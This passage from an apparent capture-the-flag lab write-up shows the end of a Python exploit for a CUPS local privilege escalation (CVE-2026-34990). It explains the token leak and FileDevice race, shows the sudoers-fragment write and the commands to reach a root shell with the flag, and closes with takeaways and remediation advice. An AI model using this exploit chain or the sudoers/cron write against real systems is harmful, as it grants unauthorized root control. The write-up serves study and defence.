             f" chmod 644 /tmp/shadow-{ATTACKER}\n".encode()):
        for _ in range(90):
            ok, out = is_root()
            if ok: print("[+] ROOT via cron"); return 0
            if os.path.exists(f"/tmp/shadow-{ATTACKER}"):
                print(f"[+] cron ran (see /tmp/shadow-{ATTACKER}); john it or reuse stage 1")
                return 0
            time.sleep(1)
    print("[-] no root yet"); return 1
if __name__ == "__main__":
    sys.exit(main())
```

CUPS 2.4.16 on `127.0.0.1:631` (8.1) is vulnerable. Leak cupsd's local admin token via a fake IPP listener, then race a `file://` print queue into persistence so the root scheduler writes an attacker-controlled file, granting aporter passwordless sudo.

**Command:**

bash

```bash
# On the portal as aporter (local attack against 127.0.0.1:631):
python3 cups_root.py aporter
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`python3 cups_root.py aporter`|Run the exploit as aporter; the argument sets the username used in `requesting-user-name` and in the sudoers fragment path/content.|
|token-leak stage (`Cap` thread)|Stands up a fake IPP server on `127.0.0.1:9189`, creates a printer pointing at it; cupsd (root) validates the device-uri, is challenged with `401 WWW-Authenticate: Local trc="y"`, and resends its reusable `Authorization: Local` admin token, which is captured.|
|race stage (`create_local` + `race_write`)|Creates a temp queue with a `file://` device-uri, then rapidly flips it to persistent (`printer-is-shared=true`, device-uri omitted) to bypass the `FileDevice` check before the background validator deletes it.|
|print-job|Sends the gzip-compressed sudoers line as the print document; the root scheduler writes it to the target file.|

**Result:**

```
[+] Local token: <REDACTED_LOCAL_TOKEN>
[*] stage 1: /etc/sudoers.d fragment
    [sw] attempt 0..11: race=won
[*] stage 2: /etc/cron.d fallback
    [cw] attempt 0..1: race=won
[+] ROOT via cron
```

**What this gives you:**

Key findings:

- The CUPS local admin token was captured, confirming the authentication-bypass (Flaw 1).
- Root file-write succeeded; `sudo -n id` subsequently returned `uid=0(root)`, confirming the sudoers fragment (`/etc/sudoers.d/aporter-pwn`) is in place and honored.
- Note on output interpretation: the script printed `ROOT via cron`, but direct verification shows the `/etc/sudoers.d` fragment is what grants root. The stage-1 `race=won` labels reflect a successful print-job status while the file-existence check lagged the actual write; the authoritative confirmation is `sudo -n id`, not the stage label.

###### How CVE-2026-34990 works (theory):

CUPS runs its scheduler (`cupsd`) as root, and the exploit chains two flaws. First, the token leak: any local user may create a temporary printer via `CUPS-Create-Local-Printer` without admin authentication. cupsd validates the supplied `device-uri` by connecting to it; if that URI points at an attacker-controlled IPP listener that replies `401` with `WWW-Authenticate: Local trc="y"`, cupsd retries and attaches its reusable `Authorization: Local <token>` admin credential, which the attacker captures. Second, the FileDevice race: writing printers to local files is normally blocked by `FileDevice No`, but the temporary queue stores its device-uri before the policy is validated. Using the stolen token to flip the queue to persistent (`printer-is-shared=true`) while omitting the device-uri wins a race that keeps the forbidden `file://` destination. A subsequent print job then makes the root scheduler open and write the target file, here an `/etc/sudoers.d` fragment granting `NOPASSWD: ALL`.

**Next:** Use the new sudo right to take a root shell and read the root flag.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 8.3 Escalate to root and capture the root flag:

**Command:**

```bash
sudo -n id
sudo -n /bin/bash
id
cat /root/root.txt
```

**Result:**

```
uid=0(root) gid=0(root) groups=0(root)
root@portal:/home/aporter# id
uid=0(root) gid=0(root) groups=0(root)
root@portal:/home/aporter# cat /root/root.txt
aae624b30f3bf6cb13aa82753d36f96e
```

**What this gives you:** Key finding: full root on the portal via the sudoers fragment; root flag retrieved.

==ROOT FLAG:== `aae624b30f3bf6cb13aa82753d36f96e`
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 9. Key Takeaways

**1. On an assumed-breach box, the first shell is a vantage point, not a goal.** Supplied creds dropped you onto a workstation with no flags on it. The instinct to hunt for `user.txt` there wastes time; the right move is to read the _network position_ of the host. Dual-homed machines, unusual interfaces, and routes to places your attacker box can't reach are the actual prize. Always run `ip -br a` and check routing before assuming a host is a dead end.

**2. Unusual hardware in software is a signpost.** Wireless interfaces on a server make no physical sense, so their presence screamed "intended path." When something is out of place for the host's role (a Wi-Fi radio on a rack server, a GUI stack on a headless box, a printer daemon on a web server), treat it as a deliberate breadcrumb and enumerate it first, not last.

**3. Two missing protections compound.** Open Wi-Fi alone leaks link-layer frames; plain HTTP alone is readable only to someone already on-path. Stacked, they hand you cleartext credentials from a passive capture. When auditing, look for _combinations_ of weak controls — each might be "low severity" alone, but together they're a full credential-disclosure chain.

**4. Pick the pivot tool that matches the work.** ligolo-ng's L3 TUN approach let `ping`, a browser, and a locally-behaving Python exploit all traverse the tunnel transparently. A SOCKS proxy would have forced `proxychains` on every tool and choked on ICMP and the raw-socket exploit. Match the tunnel's layer to what you need to send through it, and run the proxy with the privileges it needs (root, for route and interface management) from the start.

**5. Let an application decrypt its own secrets.** Rather than reversing Yii's AES/HMAC/PBKDF2 scheme in Python, calling `php craft exec` with the app's own `decryptByKey` was a two-minute job. When you have code execution in an app's context, its loaded config and crypto libraries are tools you already hold — reach for them before reimplementing cryptography by hand.

**6. Credential reuse is the connective tissue of a chain.** A _mail-relay_ password became a _system login_. Service-account and integration passwords are routinely reused onto human accounts because the same admin set them. Every password you recover is a candidate for every account and service you've seen — test reuse before assuming you need a new exploit.

**7. Verify privilege the authoritative way, not by a script's say-so.** The CUPS exploit printed `ROOT via cron` while the actual win came from the sudoers fragment, and its own `race=won` labels lagged reality. Trust `sudo -n id` / `id`, file existence, and the shell you actually get — not an exploit's self-reported status. Scripts report what they _attempted_; the system reports what _happened_.

**8. Running state is disposable; your notes are not.** A machine reset wiped the tunnel, the Wi-Fi association, and both shells, but the sealed writeup made rebuilding a ten-minute mechanical replay. Document as you go, record exact values (addresses change — `.182` vs `.183` between sessions), and background long-running helpers (`setsid`) so a stray Ctrl-C doesn't cost you the pivot.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 10. Remediation

#### 10.1 Overly permissive sudo on the workstation

**What it is:** `contractor` was granted `(ALL : ALL) ALL` in sudoers, allowing any command as any user — effectively unrestricted root on airside-ws01.

**Why it's dangerous:** It collapses the entire local trust boundary. Any compromise of a low-privilege contractor account (phishing, credential leak, as modeled here) becomes immediate root, which in turn unlocks root-only capabilities like reconfiguring network interfaces and joining hidden segments. It turned a minor foothold into the key that opened the whole internal network.

**Fix:** Apply least privilege. Grant sudo only for the specific binaries a role genuinely needs, with explicit argument constraints, and never `ALL` commands for a contractor-tier account. Audit `/etc/sudoers` and `/etc/sudoers.d/` with `visudo`, remove blanket grants, and where elevated access is required, scope it (e.g. `contractor ALL=(root) /usr/bin/specific-tool`) and log it.

#### 10.2 Open (unencrypted) wireless network

**What it is:** "HTB International WiFi" ran with no encryption (`key_mgmt=NONE`), so any associated or monitoring station could read all traffic on the channel.

**Why it's dangerous:** Open Wi-Fi exposes every frame to passive interception. Combined with cleartext application protocols, it allows silent credential theft with no interaction and no log trail on the victim side.

**Fix:** Require WPA2-Enterprise (802.1X) for any network carrying staff or internal traffic, so each client has unique credentials and traffic is encrypted per-session. At minimum use WPA3 or WPA2-PSK with a strong key. Segment guest/passenger Wi-Fi away from any network that can reach internal applications, and never bridge a captive-portal guest network to internal services.

#### 10.3 Internal web application served over plain HTTP

**What it is:** The Miles portal and the Craft CP were served over HTTP with no TLS, so login POSTs travelled in cleartext.

**Why it's dangerous:** Without TLS, credentials, session tokens, and sensitive data are readable by anyone on-path — which, on the open Wi-Fi above, was anyone in range. This is what converted the wireless weakness into an actual credential capture (jenny's password).

**Fix:** Enforce HTTPS everywhere with a valid certificate (internal CA or ACME), redirect HTTP to HTTPS, and set HSTS. Internal does not mean trusted — encrypt internal traffic to the same standard as external. Mark session cookies `Secure` and `HttpOnly`.

#### 10.4 Outdated Craft CMS (authenticated RCE)

**What it is:** Craft CMS 5.9.8 was vulnerable to the condition-config authenticated RCE (Yii behavior gadget chain); fixed in 5.10.6. The install even displayed an "update available" notice.

**Why it's dangerous:** An authenticated CP user could execute arbitrary code as the web server, turning a stolen low-value login into full code execution on the internal server. The gadget abuses legitimate framework features (behaviors, event handlers) through insufficiently restricted user-supplied configuration.

**Fix:** Patch to the fixed release (5.10.6+ / 4.18.2+) and keep the CMS and its dependencies current — the dashboard update notice should be actioned, not ignored. Enforce strong, unique CP credentials and MFA so a single leaked password is not enough. Run the web service as a least-privileged user and restrict what the webroot and app user can read/write.

#### 10.5 Secrets recoverable from the web application

**What it is:** The Craft `.env` held the master security key and DB credentials in a www-data-readable file, and the DB held a reversibly-encrypted service password that Craft's own key could decrypt.

**Why it's dangerous:** Once code execution as www-data was achieved, every stored secret was recoverable, because the decryption key lived alongside the ciphertext. Reversible encryption with a co-located key provides little protection beyond obfuscation.

**Fix:** Store secrets in a dedicated secrets manager (Vault, cloud KMS, systemd credentials) rather than a web-readable file, and restrict `.env` permissions as tightly as the app allows. Do not co-locate encryption keys with the data they protect. Critically, eliminate the credential reuse: the mail-relay account must not share a password with a system login — use distinct, randomly-generated credentials per service.

#### 10.6 Vulnerable CUPS (local privilege escalation)

**What it is:** CUPS 2.4.16 was vulnerable to CVE-2026-34990, chaining an unauthenticated local-printer creation (admin-token leak) with a `FileDevice` race to achieve a root-owned arbitrary file write; fixed in 2.4.17.

**Why it's dangerous:** Any local user, with no sudo rights, could escalate to root by abusing the root-running print scheduler. It required only loopback access to port 631, which is CUPS's default posture.

**Fix:** Patch CUPS to 2.4.17+. If printing is not needed on the host — and on a web/application server it rarely is — disable and mask the `cups` and `cups-browsed` services entirely to remove the attack surface. Where CUPS is required, bind it strictly to loopback, enforce `FileDevice No`, and require authentication for administrative IPP operations.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

